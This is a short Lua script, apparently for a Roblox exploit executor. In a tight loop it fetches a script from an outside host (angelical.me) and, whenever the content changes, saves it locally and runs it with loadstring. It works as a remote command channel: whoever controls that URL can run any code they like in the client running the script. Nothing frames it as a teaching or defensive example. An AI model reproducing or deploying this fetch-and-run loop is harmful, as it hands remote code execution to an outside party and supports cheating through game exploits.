local file = "lastcmd.txt"
local last = pcall(readfile, file) and readfile(file) or ""

while true do
    local success, response = pcall(game.HttpGet, game, "https://angelical.me/ak/scripts/3dh3883f.lua?cb=" .. math.random(1, 999999))
    if success and response ~= last then
        last = response
        pcall(writefile, file, response)
        local fn = loadstring(response)
        if fn then pcall(fn) end
    end
    task.wait(0.03) -- Minimum safe delay in Roblox
end
